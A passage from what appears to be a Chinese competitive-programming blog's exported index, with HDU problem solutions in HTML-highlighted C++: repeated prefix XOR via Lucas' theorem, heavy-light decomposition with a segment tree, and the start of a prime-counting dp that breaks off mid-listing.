ss.erase(ss.find(cnt[n]));</div><div class="line">    &#125;</div><div class="line">    --cnt[n];</div><div class="line">    ++has[cnt[n]];</div><div class="line">    <span class="keyword">if</span> (cnt[n]&gt;len) &#123;</div><div class="line">        ss.insert(cnt[n]);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    fastIO::read(T);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100000</span>;i++) &#123;</div><div class="line">        po[i][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">100</span>;j++) &#123;</div><div class="line">            po[i][j]=<span class="number">1L</span>L*po[i][j<span class="number">-1</span>]*i%MO;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> n, m;</div><div class="line">        fastIO::read(n);</div><div class="line">        fastIO::read(m);</div><div class="line">        len = <span class="built_in">sqrt</span>(n);</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            fastIO::read(a[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</div><div class="line">            <span class="keyword">int</span> l,r,k;</div><div class="line">            fastIO::read(l);</div><div class="line">            fastIO::read(r);</div><div class="line">            fastIO::read(k);</div><div class="line">            queries[i] = Query(l, r, k, i);</div><div class="line">        &#125;</div><div class="line">        sort(queries + <span class="number">1</span>, queries + m + <span class="number">1</span>);</div><div class="line">        <span class="keyword">int</span> L = <span class="number">1</span>, R = <span class="number">1</span>;</div><div class="line">        <span class="built_in">memset</span>(cnt,<span class="number">0</span>,<span class="keyword">sizeof</span>(cnt));</div><div class="line">        <span class="built_in">memset</span>(has,<span class="number">0</span>,<span class="keyword">sizeof</span>(has));</div><div class="line">        cnt[a[<span class="number">1</span>]]=<span class="number">1</span>;</div><div class="line">        has[<span class="number">1</span>]=<span class="number">1</span>;</div><div class="line">        ss.clear();</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</div><div class="line">            Query &amp;qi = queries[i];</div><div class="line">            <span class="keyword">while</span>(R &lt; qi.R) insert(a[++R]);</div><div class="line">            <span class="keyword">while</span>(L &gt; qi.L) insert(a[--L]);</div><div class="line">            <span class="keyword">while</span>(R &gt; qi.R) erase(a[R--]);</div><div class="line">            <span class="keyword">while</span>(L &lt; qi.L) erase(a[L++]);</div><div class="line">            ll ans = <span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=len;j++) &#123;</div><div class="line">                ans+=<span class="number">1L</span>L*has[j]*po[j][qi.k]%MO;</div><div class="line">                ans%=MO;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> x:ss) &#123;</div><div class="line">                ans+=po[x][qi.k];</div><div class="line">                ans%=MO;</div><div class="line">            &#125;</div><div class="line">            anss[qi.ID]=ans;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,anss[i]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h3><p>特别鸣谢 <strong>Claris</strong>！！</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 6129 Just do it</title>
      <url>/blog/2017/08/17/hdu6129/</url>
      <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>有一个长度为 $n$ 的整数序列 ${a_n}$，对其做 $m$ 次前缀异或和，求最终的序列。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>对这个过程手动模拟几行，注意不要消去，可以发现第 $m$ 次第 $i$ 个数的结果包含了 $C_{m-1+i-j}^{i-j}$ 次第 $j$ 个数($j\le i$) 。</p><p>首先我们需要判断它的奇偶性。奇偶性相当于2进制的结果，2为质数，可以使用Lucas定理。2进制的每一位只有四种情况，其中 $C_{0}^{1}=0，C_{0}^{0}=C_{1}^{0}=C_{1}^{1}=1$ 。</p><p>将 $m-1$ 和 $i-j$ 的每一位展开，在第 $k$ 位上，如果 $m-1$ 和 $i-j$ 都是 1，那么结果就是 0 。</p><p>从小到大枚举 $k$ ，表示 $i-j$ 的第 $k$ 位为 1，若 $m-1$ 的第 $k$ 位不为 1，那么直接更新<strong>a序列本身</strong>。也就是说，每次只用满足 $i-j=2^{k}$ 的 $a[j]$ 更新 $a[i]$，然而此时的 $a[j]$ 已经被 $k$ 取 $0\dots k-1$ 更新过了，所以相当于考虑了 $i-j$ 在 $0\dots k$ 位的所有情况。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2e5</span>+<span class="number">5</span>;</div><div class="line"><span class="keyword">int</span> a[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,a+i);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> k=<span class="number">1</span>;m--;</div><div class="line">        <span class="keyword">while</span> (k&lt;n) &#123;</div><div class="line">            <span class="keyword">if</span> ((m&amp;<span class="number">1</span>)==<span class="number">0</span>) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i=n;i&gt;k;i--) &#123;</div><div class="line">                    a[i]^=a[i-k];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            m&gt;&gt;=<span class="number">1</span>;k&lt;&lt;=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d%c"</span>,a[i],<span class="string">" \n"</span>[i==n]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5893 List wants to travel</title>
      <url>/blog/2017/08/09/hdu5893/</url>
      <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>给出一棵树，要求支持：</p><ol><li>询问从u到v整条路径有几段边权（相同边权连成一段）；</li><li>修改从u到v整条路径的边权。</li></ol><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>首先考虑在序列上的问题，可以用线段树维护颜色段数以及左右端的颜色。<br>对于树上的问题，用树链剖分变成序列上的问题即可。</p><p>但是写起来并不是那么好写的。。。泄露出来的标程写了 6KB 还特别恶心。。。<br>还好我搜到了一份<a href="http://blog.csdn.net/basasuya/article/details/52625574" target="_blank" rel="noopener">非常漂亮的代码</a>，同时建议做树链剖分时把线段树整体作为一个结构体~</p><p>回答询问时还要注意因为两条链都是由浅到深的，拼起来必须有一个要反过来。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;bits/stdc++.h&gt;</span></div><div class="line">using namespace std;</div><div class="line"></div><div class="line">const <span class="keyword">int</span> N=<span class="number">4</span>e4+<span class="number">5</span>;</div><div class="line">struct Edge &#123;</div><div class="line">    <span class="keyword">int</span> go,<span class="keyword">next</span>;</div><div class="line">&#125; eg[N&lt;&lt;<span class="number">1</span>];</div><div class="line"><span class="keyword">int</span> <span class="keyword">last</span>[N],tot,e[N][<span class="number">3</span>];</div><div class="line"><span class="keyword">int</span> num[N],son[N],dep[N],fa[N],<span class="keyword">pos</span>;</div><div class="line"><span class="keyword">int</span> top[N],p[N],fp[N];</div><div class="line"><span class="keyword">int</span> col[N];</div><div class="line"></div><div class="line">void init()</div><div class="line">&#123;</div><div class="line">    tot=<span class="number">0</span>;<span class="keyword">pos</span>=<span class="number">0</span>;</div><div class="line">    memset(<span class="keyword">last</span>,-<span class="number">1</span>,sizeof(<span class="keyword">last</span>));</div><div class="line">    memset(son,-<span class="number">1</span>,sizeof(son));</div><div class="line">&#125;</div><div class="line"></div><div class="line">void addedge(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>)</div><div class="line">&#123;</div><div class="line">    eg[tot]=&#123;<span class="keyword">y</span>,<span class="keyword">last</span>[<span class="keyword">x</span>]&#125;;</div><div class="line">    <span class="keyword">last</span>[<span class="keyword">x</span>]=tot++;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void dfs(<span class="keyword">int</span> u,<span class="keyword">int</span> pre,<span class="keyword">int</span> d)</div><div class="line">&#123;</div><div class="line">    dep[u]=d;</div><div class="line">    fa[u]=pre;</div><div class="line">    num[u]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="keyword">last</span>[u];i!=-<span class="number">1</span>;i=eg[i].next) &#123;</div><div class="line">        <span class="keyword">int</span> &amp;v=eg[i].go;</div><div class="line">        <span class="keyword">if</span> (v!=pre) &#123;</div><div class="line">            dfs(v,u,d+<span class="number">1</span>);</div><div class="line">            num[u]+=num[v];</div><div class="line">            <span class="keyword">if</span> (son[u]==-<span class="number">1</span>||num[v]&gt;num[son[u]]) &#123;</div><div class="line">                son[u]=v;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void getpos(<span class="keyword">int</span> u,<span class="keyword">int</span> sp)</div><div class="line">&#123;</div><div class="line">    top[u]=sp;</div><div class="line">    p[u]=++<span class="keyword">pos</span>;</div><div class="line">    fp[p[u]]=u;</div><div class="line">    <span class="keyword">if</span> (son[u]==-<span class="number">1</span>) <span class="keyword">return</span>;</div><div class="line">    getpos(son[u],sp);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="keyword">last</span>[u];i!=-<span class="number">1</span>;i=eg[i].next) &#123;</div><div class="line">        <span class="keyword">int</span> &amp;v=eg[i].go;</div><div class="line">        <span class="keyword">if</span> (v!=son[u]&amp;&amp;v!=fa[u]) &#123;</div><div class="line">            getpos(v,v);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">struct SegTree &#123;</div><div class="line">    struct Node &#123;</div><div class="line">        <span class="keyword">int</span> <span class="keyword">lc</span>,rc,cnt;</div><div class="line">        Node(<span class="keyword">int</span> a=-<span class="number">1</span>,<span class="keyword">int</span> b=<span class="number">0</span>,<span class="keyword">int</span> c=<span class="number">0</span>):<span class="keyword">lc</span>(a),rc(b),cnt(c) &#123;&#125;</div><div class="line">        Node operator +(const Node &amp;R) const &#123;</div><div class="line">            <span class="keyword">if</span> (!cnt) <span class="keyword">return</span> R;</div><div class="line">            <span class="keyword">if</span> (!R.cnt) <span class="keyword">return</span> *this;</div><div class="line">            <span class="keyword">return</span> &#123;<span class="keyword">lc</span>,R.rc,cnt+R.cnt-(rc==R.lc)&#125;;</div><div class="line">        &#125;</div><div class="line">        Node rev() &#123;</div><div class="line">            <span class="keyword">return</span> &#123;rc,<span class="keyword">lc</span>,cnt&#125;;</div><div class="line">        &#125;</div><div class="line">        void <span class="keyword">print</span>() &#123;</div><div class="line">            <span class="keyword">printf</span>(<span class="string">"%d %d %d\n"</span>,<span class="keyword">lc</span>,rc,cnt);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">tr</span>[N&lt;&lt;<span class="number">2</span>];</div><div class="line">    <span class="keyword">int</span> flag[N&lt;&lt;<span class="number">2</span>];</div><div class="line">    <span class="comment">#define lson rt&lt;&lt;1,l,m</span></div><div class="line">    <span class="comment">#define rson rt&lt;&lt;1|1,m+1,r</span></div><div class="line">    void push_up(<span class="keyword">int</span> rt)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">tr</span>[rt]=<span class="keyword">tr</span>[rt&lt;&lt;<span class="number">1</span>]+<span class="keyword">tr</span>[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>];</div><div class="line">    &#125;</div><div class="line">    void push_down(<span class="keyword">int</span> rt)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (flag[rt]!=-<span class="number">1</span>) &#123;</div><div class="line">            flag[rt&lt;&lt;<span class="number">1</span>]=flag[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]=flag[rt];</div><div class="line">            <span class="keyword">tr</span>[rt&lt;&lt;<span class="number">1</span>]=<span class="keyword">tr</span>[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]=&#123;flag[rt],flag[rt],<span class="number">1</span>&#125;;</div><div class="line">            flag[rt]=-<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    void build(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</div><div class="line">    &#123;</div><div class="line">        flag[rt]=-<span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (l==r) &#123;</div><div class="line">            <span class="keyword">tr</span>[rt]=&#123;col[l],col[l],<span class="number">1</span>&#125;;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> <span class="keyword">m</span>=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        build(lson);</div><div class="line">        build(rson);</div><div class="line">        push_up(rt);</div><div class="line">    &#125;</div><div class="line">    void update(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> col)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">            <span class="keyword">tr</span>[rt]=&#123;col,col,<span class="number">1</span>&#125;;</div><div class="line">            flag[rt]=col;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        push_down(rt);</div><div class="line">        <span class="keyword">int</span> <span class="keyword">m</span>=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (L&lt;=<span class="keyword">m</span>) update(lson,L,R,col);</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">m</span>&lt;R) update(rson,L,R,col);</div><div class="line">        push_up(rt);</div><div class="line">    &#125;</div><div class="line">    Node getsum(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> L,<span class="keyword">int</span> R)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">tr</span>[rt];</div><div class="line">        &#125;</div><div class="line">        push_down(rt);</div><div class="line">        <span class="keyword">int</span> <span class="keyword">m</span>=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        Node res;</div><div class="line">        <span class="keyword">if</span> (L&lt;=<span class="keyword">m</span>) res=res+getsum(lson,L,R);</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">m</span>&lt;R) res=res+getsum(rson,L,R);</div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">    &#125;</div><div class="line">    void change(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>,<span class="keyword">int</span> col)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> tx=top[<span class="keyword">x</span>],ty=top[<span class="keyword">y</span>];</div><div class="line">        <span class="keyword">while</span> (tx!=ty) &#123;</div><div class="line">            <span class="keyword">if</span> (dep[tx]&lt;dep[ty]) &#123;</div><div class="line">                swap(tx,ty);</div><div class="line">                swap(<span class="keyword">x</span>,<span class="keyword">y</span>);</div><div class="line">            &#125;</div><div class="line">            update(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[tx],p[<span class="keyword">x</span>],col);</div><div class="line">            <span class="keyword">x</span>=fa[tx];</div><div class="line">            tx=top[<span class="keyword">x</span>];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">x</span>==<span class="keyword">y</span>) <span class="keyword">return</span>;</div><div class="line">        <span class="keyword">if</span> (dep[<span class="keyword">x</span>]&gt;dep[<span class="keyword">y</span>]) &#123;</div><div class="line">            swap(<span class="keyword">x</span>,<span class="keyword">y</span>);</div><div class="line">        &#125;</div><div class="line">        update(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[son[<span class="keyword">x</span>]],p[<span class="keyword">y</span>],col);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> query(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> tx=top[<span class="keyword">x</span>],ty=top[<span class="keyword">y</span>];</div><div class="line">        Node X,Y;</div><div class="line">        <span class="keyword">while</span> (tx!=ty) &#123;</div><div class="line">            <span class="keyword">if</span> (dep[tx]&lt;dep[ty]) &#123;</div><div class="line">                Y=getsum(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[ty],p[<span class="keyword">y</span>])+Y;</div><div class="line">                <span class="keyword">y</span>=fa[ty];</div><div class="line">                ty=top[<span class="keyword">y</span>];</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                X=getsum(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[tx],p[<span class="keyword">x</span>])+X;</div><div class="line">                <span class="keyword">x</span>=fa[tx];</div><div class="line">                tx=top[<span class="keyword">x</span>];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        Node ans;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">x</span>==<span class="keyword">y</span>) &#123;</div><div class="line">            ans=X.rev()+Y;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">if</span> (dep[<span class="keyword">x</span>]&gt;dep[<span class="keyword">y</span>]) &#123;</div><div class="line">                ans=Y.rev()+getsum(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[son[<span class="keyword">y</span>]],p[<span class="keyword">x</span>])+X;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                ans=X.rev()+getsum(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[son[<span class="keyword">x</span>]],p[<span class="keyword">y</span>])+Y;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ans.cnt;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">#undef lson</span></div><div class="line">    <span class="comment">#undef rson</span></div><div class="line">&#125; mytree;</div><div class="line"></div><div class="line"><span class="keyword">int</span> main()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,<span class="keyword">m</span>;</div><div class="line">    <span class="keyword">while</span> (scanf(<span class="string">"%d%d"</span>,&amp;n,&amp;<span class="keyword">m</span>)!=EOF) &#123;</div><div class="line">        init();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</div><div class="line">            scanf(<span class="string">"%d%d%d"</span>,&amp;e[i][<span class="number">0</span>],&amp;e[i][<span class="number">1</span>],&amp;e[i][<span class="number">2</span>]);</div><div class="line">            addedge(e[i][<span class="number">0</span>],e[i][<span class="number">1</span>]);</div><div class="line">            addedge(e[i][<span class="number">1</span>],e[i][<span class="number">0</span>]);</div><div class="line">        &#125;</div><div class="line">        dfs(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>);</div><div class="line">        getpos(<span class="number">1</span>,<span class="number">1</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (dep[e[i][<span class="number">0</span>]]&lt;dep[e[i][<span class="number">1</span>]]) &#123;</div><div class="line">                swap(e[i][<span class="number">0</span>],e[i][<span class="number">1</span>]);</div><div class="line">            &#125;</div><div class="line">            col[p[e[i][<span class="number">0</span>]]]=e[i][<span class="number">2</span>];</div><div class="line">        &#125;</div><div class="line">        mytree.build(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>);</div><div class="line">        <span class="keyword">while</span> (<span class="keyword">m</span>--) &#123;</div><div class="line">            char op[<span class="number">9</span>];</div><div class="line">            <span class="keyword">int</span> u,v,w;</div><div class="line">            scanf(<span class="string">"%s%d%d"</span>,op,&amp;u,&amp;v);</div><div class="line">            <span class="keyword">if</span> (op[<span class="number">0</span>]==<span class="string">'C'</span>) &#123;</div><div class="line">                scanf(<span class="string">"%d"</span>,&amp;w);</div><div class="line">                mytree.change(u,v,w);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">printf</span>(<span class="string">"%d\n"</span>,mytree.query(u,v));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5901 Count primes</title>
      <url>/blog/2017/08/05/hdu5901/</url>
      <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>输出[1..n]的质数个数 (1 &lt;= n &lt;= 1e11) 。时间限制6s，空间限制64M 。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>很显然，要用线性筛的话时间和空间都不够。</p><p>有一种<a href="https://en.wikipedia.org/wiki/Meissel%E2%80%93Lehmer_algorithm" target="_blank" rel="noopener">Meissel–Lehmer算法</a>可以解决该问题，不过本文要介绍的是一种dp解法。</p><p>定义$SR(n,p)$为，$2..n$被小于等于$p$的质数筛后剩下的数的个数；也就是说，在n的范围内，是质数，或者是只由大于$p$的质数相乘得到的数的个数。<br>记小于等于$n$的质数个数为$\pi(n)$，那么显然有$SR(n,n)=\pi(n)$ 。</p><p>对$SR(n,p)$分两类讨论：</p><ul><li>当$p$不是质数或者$n&lt;p^2$时，有$SR(n,p)=SR(n,p-1)$；</li><li>当$p$是质数且$n\ge p^2$时，$SR(n,p)$ 也可由 $SR(n,p-1)$ 推得：$$SR(n,p)= SR(n,p−1)− SR(\frac{n}{p}, p−1)+ SR(p−1,p−1)$$ 表示要从 $2..p-1$ 筛后剩下的数中去掉那些质因子均大于等于 $p$ 且含 $p$ 的数，因为若有小于 $p$ 的质因子则该数已经被筛去了，同理，该数除以p也一定不会被 $2..p-1$ 筛去，所以减去 $SR(\frac{n}{p}, p−1)$，与此同时 $2..p-1$ 的质数也被减掉了，所以加上 $SR(p-1,p-1)$ 。</li></ul><p>当然因为空间限制肯定不能直接这样dp，考虑到整个过程中只用到了 $p$ 和 $\frac{n}{p}$，我们直接分为两段dp， 用<code>H[k]</code>表示 $k\le \sqrt{n}$ 时 $SR(\frac{n}{k},p)$ 的值，用<code>L[k]</code>表示 $k \le \sqrt{n}$ 时 $SR(k,p)$ 的值。</p><p>先放出代码，原作者<em><a href="http://codeforces.com/profile/adkroxx" target="_blank" rel="noopener">adkroxx</a></em>：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div 